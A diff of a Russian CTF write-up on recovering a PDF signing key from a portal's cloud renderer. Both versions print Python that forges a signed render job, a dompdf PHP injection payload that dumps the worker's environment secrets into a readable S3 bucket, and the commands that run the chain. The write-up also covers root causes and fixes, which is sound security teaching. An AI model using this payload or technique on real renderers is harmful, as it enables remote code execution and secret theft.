@@ -1,293 +1,208 @@
-# МёдХантер 3 — мастер-секрет подписи резюме (task21) — разбор
+# МёдХантер: PDF signing key — технический разбор
 
 **Флаг:** `avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}`
-**Класс:** web / cloud (RCE в dompdf → вывоз данных в облачное хранилище → восстановление секрета
-подписи) · **Сложность:** неизвестно · **Очки:** неизвестно · **Решило команд:** неизвестно
-**Автор:** неизвестно
 
-## В двух словах (без терминов)
+**Класс:** cloud / HMAC / signed job forgery / HTML injection / dompdf PHP RCE / S3 exfiltration
 
-МёдХантер — карьерный портал: он делает из резюме красивый PDF-документ и ставит на него «печать
-подлинности» — короткий код, по которому работодатель отличает настоящий документ от подделки.
-Печать считается по секретному ключу, и именно этот ключ и есть флаг.
+## Краткое техническое резюме
 
-Подобрать ключ нельзя: печать устроена криптографически стойко, и никакой перебор её не вскрывает.
-Зато сам «печатный станок» (программа, которая рисует PDF) настроена так, что **исполняет код,
-спрятанный внутри резюме**. Мы подсовываем ему резюме с крошечной вставкой-программой: «прочитай все
-свои секретные настройки и выложи их в облачную папку». А ключи от этой папки мы уже добыли в прошлой
-задаче цепочки. Забираем выложенное — и там, среди настроек, лежит тот самый секретный ключ подписи,
-он же флаг. Мораль в одном предложении: неважно, насколько крепкая печать, если по коду можно
-заставить сам станок выдать ключ.
+PDF verification code вычисляется как
+`HMAC-SHA256(key=PDF_SIGNING_KEY, message=document_id)`. Известные pairs не позволяют восстановить
+HMAC key, а secrets из task18 не совпадают с ним.
 
----
+PDF renderer принимает HMAC-signed jobs из Object Storage. Queue signing key извлечён из backend
+image в task19, поэтому attacker может сформировать валидный job. Resume fields вставляются в HTML
+без escaping, а dompdf запущен с `isPhpEnabled=true`. PHP payload в `experience` получает RCE в
+renderer process и вызывает доступную global function `s3_request()`, записывая environment dump в
+читаемый bucket. `PDF_SIGNING_KEY` из dump совпадает со всеми сохранёнными HMAC pairs.
 
-## 1. Что за задача
+## 1. Контекст и цель
 
-Третья, финальная задача цепочки «МёдХантер» (портал `https://hrportal-aoa51cvc.avitoctf.ru/`).
-Каждый выпущенный PDF получает уникальный `ID документа` и `Код проверки`, по которому работодатель
-отличает настоящий документ от подделки. По условию (`task.md`) нужно восстановить секретный ключ,
-которым подписывается этот код проверки, — восстановленный секрет и есть флаг.
+Target application: `https://hrportal-aoa51cvc.avitoctf.ru/`.
 
-> Мини-словарь: **PDF** — «электронный лист», который выглядит одинаково у всех. **Код проверки
-> (подпись)** — короткая строка-«печать», которую можно проверить, но нельзя подделать без секрета.
-> **Секретный ключ подписи** — то самое «клише печати», которое сервер держит в тайне.
+Каждый PDF содержит `document_id` и verification code. Требуется восстановить secret, которым
+подписывается code. Цепочка использует два ранее полученных capability:
 
-Задача **опирается на две предыдущие**: чтобы вообще получить пары (ID, код проверки) и добраться до
-внутренностей, нужны наработки task18 и task19 (см. ниже). Стартовые гипотезы из `task.md`: код
-проверки — это HMAC/JWT со слабым секретом (перебор по словарю), либо length-extension-атака на голый
-`md5/sha(secret‖msg)`, либо секрет утёк в уже известном `.env`, либо ключ выводится из самого `id`.
+- Object Storage credentials из
+  [`../task18/hrportal_task18_writeup.md`](../task18/hrportal_task18_writeup.md);
+- `RENDER_QUEUE_SIGNING_KEY` и prefix `incoming/` из
+  [`../task19/hrportal_task19_writeup.md`](../task19/hrportal_task19_writeup.md).
 
-## 2. Разведка — что мы увидели
+Значимые renderer sources сохранены в `task21/worker/index.php` и
+`task21/worker/render.php`.
 
-- Той же связкой, что и в task19 (**SSRF** → метаданные облака → доступ к реестру образов), вытащили
-  образ `pdf-renderer` — отдельную облачную функцию на PHP, которая и рисует PDF. В локальной
-  `task21/worker/` сохранены два значимых исходника (`index.php`, `render.php`); Composer-зависимости,
-  включая объёмную папку `vendor/` с dompdf, в репозиторий не входят. Наличие dompdf и его настройки
-  видны по `require .../vendor/autoload.php`, импортам `Dompdf` и коду инициализации в этих исходниках.
+## 2. Reconnaissance и attack surface
 
-> Мини-словарь: **SSRF** (Server-Side Request Forgery) — заставить сам сервер сходить по адресу,
-> который выбрал ты; так в task18/19 сервер сходил в служебную «метадату» облака и отдал свои
-> ключи. **облачная функция** — маленькая программа, которую облако запускает по событию (здесь —
-> «появился файл-задание»). **dompdf** — PHP-библиотека, превращающая HTML в PDF.
+`worker/index.php` вычисляет verification code:
 
-- Формула кода проверки читается прямо в исходнике воркера (`worker/index.php:191`):
-  ```php
-  $verificationCode = hash_hmac('sha256', $key, (string) $pdfSigningKey);
-  ```
-  У PHP-функции сигнатура — `hash_hmac($algo, $data, $key)`, то есть **сообщение = `$key`** (это на
-  самом деле `document_id`, имя переменной сбивает с толку), а **ключ HMAC = `$pdfSigningKey`**:
-  ```
-  код_проверки = HMAC_SHA256( ключ = PDF_SIGNING_KEY, сообщение = document_id )
-  ```
+```php
+$verificationCode = hash_hmac('sha256', $key, (string) $pdfSigningKey);
+```
 
-> Мини-словарь: **HMAC** — способ поставить «печать» на сообщение с помощью секретного ключа: из
-> ключа и сообщения получается фиксированная строка-подпись, которую без ключа не подделать и не
-> обратить. **SHA-256** — хеш-функция (превращает данные в 64-символьный «отпечаток»).
+Сигнатура PHP API — `hash_hmac($algo, $data, $key)`, поэтому:
 
-- В системе **два разных секрета**, которые легко перепутать:
+```text
+message = document_id
+key     = PDF_SIGNING_KEY
+code    = HMAC_SHA256(PDF_SIGNING_KEY, document_id)
+```
 
-  | Секрет | Что подписывает | Откуда |
-  |--------|-----------------|--------|
-  | `RENDER_QUEUE_SIGNING_KEY` = `mhq_v1_4f8c2d9a…` | конверт задания на рендер (`index.php:128`) | найден реверсом бинаря бэкенда в task19 |
-  | `PDF_SIGNING_KEY` | код проверки готового PDF — **цель этой задачи** | предстоит утечь |
+Система использует два независимых secrets:
 
-- `index.php` в самом верху делает `require render.php`, а затем сам объявляет глобальные функции
-  `s3_request()` / `s3_presign_get()` — это готовый клиент облачного хранилища. PHP регистрирует
-  такие «функции верхнего уровня» ещё на этапе чтения файла, поэтому к моменту рендера они уже
-  доступны из **любого** кода в этом процессе — запомним это, пригодится.
+| Secret | Назначение |
+|---|---|
+| `RENDER_QUEUE_SIGNING_KEY=mhq_v1_<32 hex>` | authentication job envelope |
+| `PDF_SIGNING_KEY` | HMAC verification code готового PDF |
 
-> Мини-словарь: **S3 / Object Storage** — облачное файловое хранилище («корзины»-бакеты с файлами).
-> `s3_request()` — здешняя самописная функция, умеющая класть/брать файлы в бакет по ключам доступа.
+Четыре реальные пары `(document_id, verification_code)` сохранены в `pairs_sorted.txt`. Проверка
+известных secrets, message encodings и перестановок HMAC arguments не даёт совпадений. Length-extension
+неприменима, поскольку используется HMAC, а не `SHA256(secret || message)`.
 
-- `render.php:65`: `$options->set('isPhpEnabled', true)` — dompdf **сконфигурирован исполнять**
-  вставки `<script type="text/php">…</script>` прямо внутри рисуемого HTML.
-- `render.php:42-48`: функция `build_html()` вставляет поля резюме (`title/about/experience/skills/
-  contact`) в HTML **сырыми**, без экранирования (`htmlspecialchars`).
+## 3. Анализ и проверка гипотез
 
-Эти два последних факта вместе — уже готовая дыра: пользователь пишет HTML, а dompdf его исполняет.
+`worker/render.php` создаёт dompdf options:
 
-## 3. Как мы дошли до решения (главный раздел)
+```php
+$options->set('isPhpEnabled', true);
+```
 
-**Наблюдение 1.** Код проверки — 64 hex-символа, похоже на SHA-256/HMAC-SHA256. Исходник воркера
-подтвердил формулу буквально: `hash_hmac('sha256', $key, $pdfSigningKey)`.
+`build_html()` вставляет `title`, `about`, `experience`, `skills` и `contact` без
+`htmlspecialchars`. Следовательно, поле resume допускает injection:
 
-**Гипотеза A (самая дешёвая, проверяем первой): секрет уже у нас.** В task18 SSRF слил `.env`
-бэкенда с несколькими секретами. Раз задача просит «восстановить секрет», логично сперва проверить —
-не совпадает ли `PDF_SIGNING_KEY` с чем-то уже известным; это стоило бы ноль дополнительной работы.
+```html
+<script type="text/php"> ... </script>
+```
 
-**Проверка.** Собрали реальные пары (`ID`, `код проверки`) с настоящих PDF, выпущенных через портал
-(4 пары, `pairs_sorted.txt`). Написали перебор: все разумные формы сообщения (ID как есть / без
-дефисов / в разных регистрах / ID+имя) × все конструкции (`hmac_sha256`, `sha256(secret+msg)`,
-`sha256(msg+secret)`, перестановка аргументов HMAC) × каждый известный секрет task18 (`brute_sig.py`,
-`solve_scheme.py`, `verify_sig.py`). Схему принимали за верную, только если она сходилась **на всех
-4 парах разом** (защита от случайного совпадения на одной).
+Worker проверяет job envelope с `RENDER_QUEUE_SIGNING_KEY`. Формат подписи:
 
-**Результат — тупик, но полезный.** Не сошлось **ничего**. Вывод: `PDF_SIGNING_KEY` — самостоятельный
-секрет, ни с чем из task18 не совпадает. А раз HMAC однонаправленный, из пар (ID, код) его не
-вытащить аналитически (и рассинхрона схемы, который позволил бы «обратить» функцию, тоже нет). Значит
-нужен **канал утечки**, а не подбор.
+```text
+payload_b64 = base64(JSON(resume))
+signature   = HMAC_SHA256(MHQ_KEY, job_key + "." + payload_b64)
+envelope    = {"key": job_key, "payload": payload_b64, "signature": signature}
+```
 
-**Тупик, закрытый чтением кода (без единого пейлоада): length-extension.** Стартовая гипотеза из
-`task.md` предполагала классическую «атаку удлинения» на голый `md5/sha(secret‖msg)`. Но код явно
-использует `hash_hmac`, а HMAC по конструкции (двойное, вложенное хеширование) к length-extension
-устойчив. Ветку закрыли на уровне исходника, не тратя время.
+Storage event запускает worker только для object key `incoming/<job-key>.json`.
 
-> Мини-словарь: **length-extension** — трюк, позволяющий дописать данные к сообщению и пересчитать
-> подпись, зная только `hash(secret‖msg)`, но **не** сам секрет. Работает против «голого» `sha(...)`,
-> но **не** против HMAC.
+Первичный payload выводил environment через `$pdf->page_text`, но generated PDF помещается в
+results bucket, credentials которого недоступны. Рабочий exfiltration channel использует функцию
+`s3_request()` из `index.php`. Injected PHP выполняется в том же process и записывает environment
+dump в `medhunter-resumes-6d6c314a/loot/`, доступный с credentials task18.
 
-**Гипотеза B: раз секрет надо утечь, а рендер — это PHP-код в облачной функции, ищем в рендере RCE.**
-Исходник `render.php` дал сразу два нужных факта: `isPhpEnabled=true` (dompdf исполнит вставку
-`<script type="text/php">`) и отсутствие экранирования полей резюме. Значит поле `experience` — прямая
-точка внедрения PHP-кода, если удастся заставить воркер отрендерить **наше** резюме.
+## 4. Корневая причина
 
-> Мини-словарь: **RCE** (Remote Code Execution) — «удалённое выполнение кода»: заставить чужой сервер
-> выполнить твою программу.
+1. User-controlled resume fields включаются в HTML без context-appropriate escaping.
+2. dompdf исполняет embedded PHP из недоверенного HTML из-за `isPhpEnabled=true`.
+3. Queue signing key размещён в backend image и доступен после compromise registry chain.
+4. Renderer process одновременно хранит `PDF_SIGNING_KEY`, Storage credentials и executable S3
+   client function.
+5. Input jobs и attacker-readable exfiltration objects используют один bucket без prefix-level
+   isolation.
 
-**Проверка входа: как заставить воркер взять наше резюме?** `index.php:128` проверяет подпись
-«конверта» задания ключом `RENDER_QUEUE_SIGNING_KEY` (`mhq_v1_[0-9a-f]{32}`) — а этот ключ у нас уже
-есть из реверса бинаря в task19. Значит можем сами подписать произвольный JSON-резюме валидным
-конвертом. `forge.py` подтвердил: наша сборка `HMAC(mhq, key + "." + payload)` совпадает с проверкой
-воркера (конверт не отвергается).
+Cryptographic primitive HMAC реализован корректно; compromise происходит через RCE в process,
+который хранит secret.
 
-**Тупик №1 эксплуатации: пейлоад печатал секреты прямо в PDF.** Первый рабочий RCE (`exploit.py`)
-выводил значения `getenv()` через `$pdf->page_text(...)` **на страницу** генерируемого документа. Но
-готовый PDF уходит в **отдельный** бакет результатов под ключами `RESULTS_ACCESS_KEY/…`, которых у
-нас **нет**. То есть мы вписали секреты в документ, который сами же прочитать не можем. RCE рабочий,
-канал вывода — глухой.
+## 5. Эксплуатация
 
-**Гипотеза C, закрывающая тупик №1: вывозить не через PDF, а через уже готовую функцию
-`s3_request()`.** Наш PHP исполняется в том же процессе, где `index.php` объявил глобальные функции
-хранилища. Значит инжектированный код может **сам** вызвать `s3_request()` — с собственными ключами
-воркера (`STORAGE_ACCESS_KEY/SECRET_KEY` из его окружения) — и записать дамп настроек в бакет
-`medhunter-resumes-6d6c314a`, **тот самый**, ключи от которого мы уже читаем своими (из task18).
-Переписали пейлоад (`exploit2.py`): вместо `page_text` — `s3_request("PUT", …, "loot/dump-<uuid>.txt",
-$d, …)`.
+Формирование signed envelope:
 
-**Тупик №2, быстро закрытый по бинарю: куда класть конверт.** Просто положить подписанный JSON в
-корень бакета рендер не запускает — воркер триггерится хранилищем только по конкретному префиксу. В
-уже вытащенном в task19 бинаре бэкенда нашлась строка `incoming/`; положили конверт как
-`incoming/<uuid>.json` — воркер отреагировал (добыча появилась в бакете чуть позже).
+```python
+job_key = str(uuid.uuid4())
+payload_b64 = base64.b64encode(
+    json.dumps(resume, separators=(",", ":")).encode()
+).decode()
+signature = hmac.new(
+    mhq_key.encode(),
+    (job_key + "." + payload_b64).encode(),
+    hashlib.sha256,
+).hexdigest()
+```
 
-**Проверка гипотезы C.** Положили сгенерированный конверт под `incoming/<uuid>.json` (`s3put.py`),
-подождали обработку, прочитали `loot/dump-<uuid>.txt` своими ключами (`s3.py`). В дампе — всё
-окружение воркера, включая `PDF_SIGNING_KEY=avito{...}`.
+Payload для environment exfiltration:
 
-**Финальная проверка (не «похоже на флаг», а криптоподтверждение).** Пересчитали код проверки по
-формуле `index.php:191` для всех 4 пар из `pairs_sorted.txt`, взяв восстановленный `PDF_SIGNING_KEY`
-как ключ HMAC. Все 4 совпали байт-в-байт (тогда как в гипотезе A ни один известный секрет не
-воспроизвёл ни одной пары). Значит секрет настоящий, а не просто похожая на флаг строка в настройках.
+```php
+<script type="text/php">
+$dump = "";
+foreach (getenv() as $name => $value) {
+    $dump .= $name . "=" . $value . "\n";
+}
+s3_request(
+    "PUT",
+    getenv("STORAGE_ACCESS_KEY"),
+    getenv("STORAGE_SECRET_KEY"),
+    "medhunter-resumes-6d6c314a",
+    "loot/dump-<uuid>.txt",
+    $dump,
+    "text/plain"
+);
+</script>
+```
 
-## 4. В чём именно ошибка (суть уязвимости)
-
-Простыми словами: **стойкость печати ничего не стоит, если сам «печатный станок» можно заставить
-выполнить чужой код и выложить свои настройки наружу.** Дыра — не в криптографии подписи, а в том,
-что процесс, который эту подпись знает, исполняет пользовательский HTML и имеет под рукой ключи
-записи в доступное атакующему хранилище.
-
-Точно, цепочка причин:
-
-1. **`isPhpEnabled = true` в dompdf** (`worker/render.php:65`) — dompdf исполняет
-   `<script type="text/php">…</script>` прямо в процессе рендера. Управляешь HTML — управляешь кодом.
-2. **Нет экранирования полей резюме** (`render.php:42-48`) — `build_html()` вставляет поля сырыми;
-   любое из них (в частности `experience`) — точка внедрения.
-3. **Клиент записи в S3 доступен из области видимости пейлоада** — `index.php` объявил
-   `s3_request()`/`s3_presign_get()` как функции верхнего уровня до вызова `render_pdf()`, так что
-   инжектированный PHP вызывает их от имени воркера.
-4. **Один общий бакет** (`medhunter-resumes-6d6c314a`) используется и для входящих заданий, и для
-   служебных путей вроде `loot/` — а ключи от него утекли ещё в task18; воркер кладёт добычу ровно
-   туда, куда мы уже дотягиваемся своими ключами.
-5. **`PDF_SIGNING_KEY` живёт в окружении процесса, который умеет исполнять произвольный код.**
-   Стойкость самого HMAC (гипотеза A это подтвердила) не спасает: правильный вопрос — не «можно ли
-   подобрать секрет», а «что ещё умеет процесс, который его хранит».
-
-## 5. Эксплойт по шагам
-
-1. **Убедиться, что перебор бесполезен** (мотивирует переход к RCE): прогнать
-   `verify_sig.py`/`solve_scheme.py`/`brute_sig.py` — ни одна форма сообщения × ни один известный
-   секрет task18 не бьётся с парами из `pairs_sorted.txt`.
-2. **Подделать конверт задания** ключом `mhq_v1_…` из task19 (`forge.py` проверяет, что подпись
-   сходится с `index.php:128`):
-   ```python
-   MHQ = os.environ["RENDER_QUEUE_SIGNING_KEY"]  # найденный в task19 mhq_v1_<32 hex>
-   key = str(uuid.uuid4())
-   payload_b64 = base64.b64encode(json.dumps(resume, separators=(",", ":")).encode()).decode()
-   sig = hmac.new(MHQ.encode(), (key + "." + payload_b64).encode(), hashlib.sha256).hexdigest()
-   obj = {"key": key, "payload": payload_b64, "signature": sig}
-   ```
-3. **Вложить PHP-пейлоад в поле `experience`** резюме (финальная версия — пишет через собственные
-   S3-ключи воркера, см. §3 «тупик №1»):
-   ```php
-   <script type="text/php">
-   $d="";
-   foreach (getenv() as $k=>$v){ $d .= $k."=".$v."\n"; }
-   if (function_exists("s3_request")) {
-     s3_request("PUT", getenv("STORAGE_ACCESS_KEY"), getenv("STORAGE_SECRET_KEY"),
-                "medhunter-resumes-6d6c314a", "loot/dump-<uuid>.txt", $d, "text/plain"); }
-   </script>
-   ```
-   Собрать и подписать такой конверт из корня репозитория:
-   `uv run python task21/exploit2.py --out task21/exploit2.json`. Скрипт пишет **только JSON-задание**,
-   а `job key` и случайный путь `loot/dump-<uuid>.txt` печатает в stdout; отдельного loot-файла он не создаёт.
-4. **Положить конверт под триггерящий префикс `incoming/`** своими ключами S3 из task18:
-   ```
-   uv run python task21/s3put.py put medhunter-resumes-6d6c314a incoming/<job-key>.json task21/exploit2.json
-   ```
-   Воркер по событию: `HEAD` → `GET` → `DELETE` → проверка подписи (наша валидна) → `render_pdf`, где
-   dompdf исполняет наш PHP.
-5. **Забрать добычу своими ключами S3:**
-   ```
-   uv run python task21/s3.py get medhunter-resumes-6d6c314a loot/dump-<uuid>.txt
-   ```
-   В дампе — `PDF_SIGNING_KEY=avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}` (плюс
-   `RENDER_QUEUE_SIGNING_KEY`, `RESULTS_ACCESS_KEY/SECRET_KEY`, `CALLBACK_URL/SECRET`).
-6. **Криптографически подтвердить ключ** — пересчитать код проверки для всех пар из `pairs_sorted.txt`
-   восстановленным секретом и сверить байт-в-байт (см. §3, финальная проверка).
-
-Ручные команды выше полезны как разбор протокола. Полностью цепочку forge→PUT→poll→GET→извлечение
-`PDF_SIGNING_KEY` и финальную сверку со всеми парами из `pairs_sorted.txt` выполняет один entry point;
-значения секретов в код не зашиты:
+Ручной workflow:
 
 ```bash
-STORAGE_ACCESS_KEY=... STORAGE_SECRET_KEY=... \
+uv run python task21/exploit2.py --out task21/exploit2.json
+
+uv run python task21/s3put.py put \
+  medhunter-resumes-6d6c314a \
+  incoming/<job-key>.json \
+  task21/exploit2.json
+
+uv run python task21/s3.py get \
+  medhunter-resumes-6d6c314a \
+  loot/dump-<uuid>.txt
+```
+
+End-to-end solver выполняет forge, PUT, polling, GET, extraction и HMAC verification:
+
+```bash
+STORAGE_ACCESS_KEY=... \
+STORAGE_SECRET_KEY=... \
 RENDER_QUEUE_SIGNING_KEY=mhq_v1_... \
 uv run python task21/solve_task21.py
 ```
 
+Полученный `PDF_SIGNING_KEY` проверяется по всем pairs из `pairs_sorted.txt`:
+
+```text
+HMAC_SHA256(PDF_SIGNING_KEY, document_id) == verification_code
+```
+
+Локальный self-test:
+
+```bash
+uv run python task21/solve_task21.py --self-test
+```
+
 ## 6. Флаг
 
-```
+```text
 avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}
 ```
 
-Это буквально значение `PDF_SIGNING_KEY` — сам мастер-секрет подписи и есть флаг. Имя флага честно
-описывает всю цепочку: «medoedsk cloud, dompdf RCE via S3 lambda».
+Это значение переменной environment `PDF_SIGNING_KEY`.
 
-## 7. Мораль — какой это урок
+## 7. Выводы и рекомендации
 
-**Класс ошибки: секрет держат в том же процессе, который выполняет недоверенный код, — и крепкая
-криптография обнуляется одним запросом.**
+- Отключить `isPhpEnabled` для dompdf при обработке user-controlled documents.
+- Экранировать все resume fields по HTML context и применять allowlist sanitizer.
+- Выполнять renderer в isolated sandbox без network egress, reusable cloud credentials и access к
+  signing secrets.
+- Разделить input, result и internal buckets; применять prefix-scoped IAM policies и разные service
+  accounts.
+- Хранить document signing key в KMS/HSM и предоставлять renderer только operation `MAC`, без export
+  raw key material.
+- Регулярно ротировать queue/storage/signing keys после image или IMDS compromise.
+- Проверять signed job consumers на injection после signature verification: valid signature не делает
+  payload trusted.
 
-- **Что сделали не так.** Настроили HTML→PDF-рендерер (dompdf) исполнять встроенный PHP
-  (`isPhpEnabled=true`) над **пользовательскими** данными, да ещё вставляли поля резюме без
-  экранирования. Плюс тот же процесс держал в окружении и секрет подписи, и ключи записи в бакет,
-  который атакующий читает.
-- **Почему так вышло.** Заблуждение «наша печать криптостойкая, значит секрет в безопасности».
-  Стойкость HMAC защищает от подделки печати **снаружи**, но никак не от того, что владельца печати
-  можно заставить выдать ключ **изнутри**. Безопасность — это не только «крепкий алгоритм», но и
-  «кто/что имеет доступ к секрету».
-- **Как надо было.** (1) Рендереры HTML→PDF **никогда** не должны исполнять встроенный код над
-  пользовательским вводом — держать `isPhpEnabled=false` и экранировать все поля (`htmlspecialchars`).
-  (2) Разделять секреты и права по процессам и бакетам: процесс, который умеет исполнять произвольный
-  код, не должен одновременно держать в окружении мастер-секрет подписи и иметь готовый клиент записи
-  в хранилище, доступное на чтение кому-то ещё. (3) Хранить критичные секреты в специализированном
-  хранилище (KMS/Secrets Manager), а не в переменных окружения рендер-воркера.
-- **На что смотреть, чтобы не повторить.** Любая опция вида «исполнять код/шаблон/скрипт внутри
-  контента» (`isPhpEnabled`, включённые шаблонизаторы, `eval`, LaTeX-shell-escape) над недоверенными
-  данными — красный флаг. И правило провенанса: одна дыра тянет за собой всю цепочку — здесь одна
-  SSRF в МёдХантере (task18) раскрутилась в полную компрометацию подписи документов (task21). Ни один
-  шаг task21 не сработал бы без ключа очереди из task19 и ключей бакета из task18.
+## 8. Файлы для воспроизведения
 
-## 8. Файлы в папке
+Version-controlled artifacts:
 
-- `solve_task21.py` — основной one-shot solver: форджит задание, кладёт его в `incoming/`, ждёт объект
-  `loot/`, скачивает его, печатает `PDF_SIGNING_KEY`/флаг и проверяет ключ по сохранённым HMAC-парам.
-  Self-test:
-  `uv run python task21/solve_task21.py --self-test`.
-- `exploit2.py` — выверенный PoC: форджит HMAC-подписанный конверт задания и PHP-пейлоад, который
-  сливает окружение воркера через его собственный S3-клиент в общий бакет (секреты параметризованы
-  через окружение/CLI).
-- `forge.py` — минимальная проверка, что наша сборка подписи конверта (`HMAC(mhq, key+"."+payload)`)
-  бьётся с проверкой `index.php:128`.
-- `exploit.py` — первая версия RCE-пейлоада (печать секретов прямо в PDF); зафиксирована как «тупик
-  №1» из §3 (недостижимый бакет результатов).
-- `verify_sig.py`, `solve_scheme.py`, `brute_sig.py` — перебор форм сообщения × известных секретов
-  task18 против реальных пар (ID, код); зафиксированный отрицательный результат (гипотеза A).
-- `s3.py`, `s3put.py` — самописные клиенты облачного хранилища (GET/PUT/list), используемые one-shot
-  solver'ом; ключи task18 читают из `STORAGE_ACCESS_KEY`/`STORAGE_SECRET_KEY`.
-- `pairs_sorted.txt` — 4 реальные пары (ID, код проверки) с боевых PDF; используются и в переборе, и
-  в финальной проверке ключа.
-- `worker/index.php`, `worker/render.php` — локально распакованное значимое подмножество исходников
-  PDF-воркера (реверс образа `pdf-renderer` из task19); `vendor/` и полный образ не коммитятся.
-- `task.md` — условие задачи.
-- Секреты (ключи S3, значения из дампа окружения) — только локально, в git не коммитятся.
+- `task21/solve_task21.py` — one-shot forge → upload → poll → download → key verification.
+- `task21/exploit2.py` — signed job и dompdf PHP payload с S3 exfiltration.
+- `task21/s3.py`, `task21/s3put.py` — SigV4 Object Storage clients.
+- `task21/pairs_sorted.txt` — четыре пары `document_id`/verification code.
+
+Renderer sources и diagnostic HMAC/payload scripts не входят в version-controlled набор;
+reproduction logic объединена в `task21/solve_task21.py` и `task21/exploit2.py`.
